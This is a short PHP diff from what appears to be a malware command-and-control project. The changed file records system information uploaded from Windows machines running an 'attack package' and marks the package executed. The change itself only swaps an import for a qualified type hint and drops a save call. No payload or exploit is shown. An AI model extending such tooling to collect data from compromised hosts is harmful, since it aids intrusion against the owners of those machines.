@@ -1,9 +1,6 @@
 <?php
 
-use Kelvinho\Virus\Attack\Packages\Windows\OneTime\SystemInfo\SystemInfo;
-
-/** @var SystemInfo $this */
+/** @var \Kelvinho\Virus\Attack\Packages\Windows\OneTime\SystemInfo\SystemInfo $this */
 
 $this->setSystemInfo($this->requestData->fileCheck("systemFile"));
 $this->setExecuted();
-$this->saveState();
